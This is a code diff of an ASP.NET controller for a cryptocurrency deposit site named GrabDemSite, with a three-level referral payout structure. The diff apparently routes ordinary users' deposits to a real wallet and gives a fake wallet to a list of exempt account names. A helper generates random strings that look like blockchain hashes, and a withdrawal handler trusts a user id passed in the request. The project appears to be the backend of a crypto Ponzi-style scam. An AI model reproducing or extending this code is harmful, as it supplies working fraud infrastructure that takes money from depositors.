@@ -20,7 +20,7 @@ namespace GrabDemSite.Controllers
         private const string FakeWallet = "randomFakeWallet";
         static float bitcoinSupply = 38.743898f;
         private const string adminName = "Test1";
-        private readonly string[] listOfNamesToAvoid = {"SkAg1","BlAg2","5aAg3","TyAg4","66Ag5","SpecAg"};
+        private readonly string[] listOfNamesToAvoid = { "SkAg1", "BlAg2", "5aAg3", "TyAg4", "66Ag5", "SpecAg" };
         private Random rnd = new Random();
         private const string alphnum = "1234567890abcdefghijklmnopqrstuvwxyz";
         public HomeController(ILogger<HomeController> logger, ApplicationDbContext context)
@@ -61,6 +61,7 @@ namespace GrabDemSite.Controllers
         [Authorize]
         public async Task<IActionResult> Deposit()
         {
+
             ViewData["Title"] = "Deposit";
             ViewBag.ErrorSum = "";
             var user = _context.GetUserByName(this.User.Identity.Name);
@@ -68,6 +69,7 @@ namespace GrabDemSite.Controllers
             {
                 return RedirectToAction("Profile", false);
             }
+
             return View(user);
         }
         [Authorize]
@@ -95,7 +97,6 @@ namespace GrabDemSite.Controllers
             else
             {
                 ViewBag.Error = null;
-
             }
             if (_context.Users.Where(x => x.InviteWithLink == user.InviteLink).FirstOrDefault() != default)
             {
@@ -114,13 +115,10 @@ namespace GrabDemSite.Controllers
                 }
                 else
                 {
-                    await Task.Run(() =>
+                    for (int i = 0; i < userslv1.Count(); i++)
                     {
-                        for (int i = 0; i < userslv1.Count(); i++)
-                        {
-                            wholeBal += userslv1[i].MoneySpent;
-                        }
-                    });
+                        wholeBal += userslv1[i].MoneySpent;
+                    }
                 }
                 ViewBag.Level1 = userslv1;
                 userslv1 = await _context.Users.Where(x => x.InviteWithLink == user.InviteLink).ToListAsync();
@@ -147,25 +145,19 @@ namespace GrabDemSite.Controllers
                     }
                     else
                     {
-                        await Task.Run(() =>
-                        {
                             for (int i = 0; i < userslv2.Count(); i++)
                             {
                                 wholeBal += userslv2[i].MoneySpent;
                             }
-                        });
                     }
                     if (await _context.Users.Where(x => x.InviteWithLink == userslv2[0].InviteLink).FirstOrDefaultAsync() != default)
                     {
                         userslv3.Remove(fakeUser);
-                        await Task.Run(() =>
-                        {
                             for (int i = 0; i < userslv2.Count(); i++)
                             {
                                 userslv3.AddRange(_context.Users.Where(x => x.InviteWithLink == userslv2[i].InviteLink).ToList());
                                 userslv2.OrderBy(x => x.MoneySpent);
                             }
-                        });
                         if (name.IsNameToAvoidHere(listOfNamesToAvoid))
                         {
                             foreach (var user11 in userslv3)
@@ -178,13 +170,10 @@ namespace GrabDemSite.Controllers
                         }
                         else
                         {
-                            await Task.Run(() =>
-                            {
                                 for (int i = 0; i < userslv3.Count(); i++)
                                 {
                                     wholeBal += userslv3[i].MoneySpent;
                                 }
-                            });
                         }
                     }
                 }
@@ -195,6 +184,7 @@ namespace GrabDemSite.Controllers
             ViewBag.WholeBal = wholeBal;
             return View(user);
         }
+
         [Authorize]
         public async Task<IActionResult> AdminMenu()
         {
@@ -232,7 +222,7 @@ namespace GrabDemSite.Controllers
             {
                 return RedirectToAction("Index");
             }
-            ViewBag.Withdraws = await _context.WithdrawDatas.Where(x => x.WalletAddress == wallet && x.IsConfirmed==false).ToListAsync();
+            ViewBag.Withdraws = await _context.WithdrawDatas.Where(x => x.WalletAddress == wallet && x.IsConfirmed == false).ToListAsync();
             return View();
         }
         [Authorize]
@@ -286,7 +276,7 @@ namespace GrabDemSite.Controllers
             UserDataModel user1 = await _context.Users.Where(x => x.InviteLink == user.InviteWithLink).SingleAsync();
             var task = _context.GetTaskByUser(user1);
             var task1 = _context.GetTaskByUser(user);
-            StaticWorkMethods.IncreaseTaskAndBalance(balance, ref task1,ref user);
+            StaticWorkMethods.IncreaseTaskAndBalance(balance, ref task1, ref user);
             StaticWorkMethods.ChangeLevelByMoneySpent(ref user);
             task.Count++;
             _context.Update(task);
@@ -323,15 +313,16 @@ namespace GrabDemSite.Controllers
             {
                 return RedirectToAction("Index");
             }
-            WithdrawDataModel withdrawReq = new WithdrawDataModel(Guid.NewGuid().ToString(),user.WalletAddress,money,user);
+            WithdrawDataModel withdrawReq = new WithdrawDataModel(Guid.NewGuid().ToString(), user.WalletAddress, money, user);
             ViewBag.Mon = money;
             return View("ConfirmWithdraw", withdrawReq);
         }
+
         [Authorize]
         public async Task<IActionResult> ConfirmedWithdraw(string id, double money, string wallet, string iduser)
         {
             var user = _context.GetUserById(iduser);
-            var withdrawReq = new WithdrawDataModel(id,wallet,money-(money*0.06),user,false,DateTime.Now);
+            var withdrawReq = new WithdrawDataModel(id, wallet, money - (money * 0.06), user, false, DateTime.Now);
             user.Balance -= money;
             user.PlayMoney -= money;
             await _context.WithdrawDatas.AddAsync(withdrawReq);
@@ -396,7 +387,7 @@ namespace GrabDemSite.Controllers
             t.Count--;
             t.NewAccount = false;
             _context.Update(t);
-            u.Balance = StaticWorkMethods.AddBalanceByLevel(u.Balance,u.PlayMoney, u.Level);
+            u.Balance = StaticWorkMethods.AddBalanceByLevel(u.Balance, u.PlayMoney, u.Level);
             _context.Update(u);
             _context.SaveChanges();
             return RedirectToAction("Index");
@@ -404,11 +395,11 @@ namespace GrabDemSite.Controllers
         private string RandomizeBlockchain()
         {
             string x = "";
-                for (int i = 1; i <= 65; i++)
-                {
-                    x += alphnum[rnd.Next(0, alphnum.Length)];
-                }
-                return x;
+            for (int i = 1; i <= 65; i++)
+            {
+                x += alphnum[rnd.Next(0, alphnum.Length)];
+            }
+            return x;
         }
         [Authorize]
         public async Task<IActionResult> CompletedTask()
@@ -421,11 +412,11 @@ namespace GrabDemSite.Controllers
             string name = this.User.Identity.Name;
             if (name.IsNameToAvoidHere(listOfNamesToAvoid))
             {
-                return Wallet;
+                return FakeWallet;
             }
             else
             {
-                return FakeWallet;
+                return Wallet;
             }
         }
         [Authorize]
@@ -439,16 +430,17 @@ namespace GrabDemSite.Controllers
             }
             else
             {
-                DepositDataModel depReq = new DepositDataModel(Guid.NewGuid().ToString(),user,user.Email,money);
+                DepositDataModel depReq = new DepositDataModel(Guid.NewGuid().ToString(), user, user.Email, money);
                 ViewBag.Wallet = WalletSelector();
                 return View("TryDeposit", depReq);
             }
         }
+
         [Authorize]
         public async Task<IActionResult> TryTheDeposit(string id, double money, string userid)
         {
             var user = _context.GetUserById(id);
-            DepositDataModel deposit = new DepositDataModel(id,user,user.Email,money,false,DateTime.Now);
+            DepositDataModel deposit = new DepositDataModel(id, user, user.Email, money, false, DateTime.Now);
             await _context.DepositDatas.AddAsync(deposit);
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("Person tries to deposit \n\n\n\n");
